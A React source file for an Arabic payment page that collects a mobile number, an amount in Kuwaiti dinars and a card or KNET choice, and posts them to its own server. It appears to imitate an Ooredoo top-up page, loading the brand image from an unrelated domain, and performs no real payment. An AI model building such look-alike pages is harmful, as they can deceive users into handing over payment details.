import React, { useState } from 'react';
import { useLocation } from 'wouter';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Card } from '@/components/ui/card';
import { trpc } from '@/lib/trpc';

export default function Payment() {
  const [, setLocation] = useLocation();
  const [mobileNumber, setMobileNumber] = useState('');
  const [amount, setAmount] = useState('5');
  const [paymentMethod, setPaymentMethod] = useState('card');
  const [loading, setLoading] = useState(false);

  const handlePayment = async () => {
    if (!mobileNumber || !amount) {
      alert('يرجى ملء جميع الحقول');
      return;
    }

    setLoading(true);
    try {
      // إرسال البيانات إلى الخادم
      const response = await fetch('/api/trpc/payment.submitPayment', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          mobileNumber,
          amount: parseFloat(amount),
          paymentMethod,
        }),
      });

      if (response.ok) {
        alert('تم إرسال بيانات الدفع بنجاح');
        setMobileNumber('');
        setAmount('5');
      } else {
        alert('حدث خطأ في الدفع');
      }
    } catch (error) {
      console.error('Error:', error);
      alert('حدث خطأ في الاتصال بالخادم');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-b from-red-50 to-white">
      {/* Header */}
      <div className="bg-red-600 text-white p-4 flex justify-between items-center">
        <button onClick={() => setLocation('/')} className="text-xl">←</button>
        <h1 className="text-xl font-bold">الدفع</h1>
        <button className="text-xl">⚙️</button>
      </div>

      {/* Main Content */}
      <div className="max-w-md mx-auto p-4 mt-6">
        <Card className="p-6 shadow-lg">
          <div className="mb-6">
            <img 
              src="https://asderw-link.com/myooredoo/topimage.jpg" 
              alt="Ooredoo" 
              className="w-full rounded-lg"
            />
          </div>

          {/* Mobile Number Input */}
          <div className="mb-4">
            <label className="block text-sm font-semibold text-gray-700 mb-2">
              رقم الهاتف المحمول
            </label>
            <Input
              type="text"
              value={mobileNumber}
              onChange={(e) => setMobileNumber(e.target.value)}
              placeholder="أدخل رقم الهاتف"
              maxLength={8}
              className="w-full border-2 border-red-500"
            />
          </div>

          {/* Amount Input */}
          <div className="mb-6">
            <label className="block text-sm font-semibold text-gray-700 mb-2">
              المبلغ
            </label>
            <div className="flex gap-2">
              <Input
                type="text"
                value={amount}
                onChange={(e) => setAmount(e.target.value)}
                placeholder="أدخل المبلغ"
                maxLength={8}
                className="flex-1"
              />
              <span className="px-4 py-2 bg-gray-200 rounded font-semibold">د.ك</span>
            </div>
          </div>

          {/* Payment Method */}
          <div className="mb-6">
            <label className="block text-sm font-semibold text-gray-700 mb-2">
              طريقة الدفع
            </label>
            <div className="space-y-2">
              <label className="flex items-center">
                <input
                  type="radio"
                  value="card"
                  checked={paymentMethod === 'card'}
                  onChange={(e) => setPaymentMethod(e.target.value)}
                  className="mr-2"
                />
                بطاقة ائتمان
              </label>
              <label className="flex items-center">
                <input
                  type="radio"
                  value="knet"
                  checked={paymentMethod === 'knet'}
                  onChange={(e) => setPaymentMethod(e.target.value)}
                  className="mr-2"
                />
                KNET
              </label>
            </div>
          </div>

          {/* Submit Button */}
          <Button
            onClick={handlePayment}
            disabled={loading}
            className="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-3 rounded-lg"
          >
            {loading ? 'جاري المعالجة...' : 'متابعة الدفع'}
          </Button>
        </Card>

        {/* Total Section */}
        <div className="mt-6 bg-white p-4 rounded-lg shadow">
          <div className="flex justify-between items-center">
            <span className="text-gray-700">الإجمالي:</span>
            <span className="text-xl font-bold text-red-600">{amount} د.ك</span>
          </div>
        </div>
      </div>
    </div>
  );
}
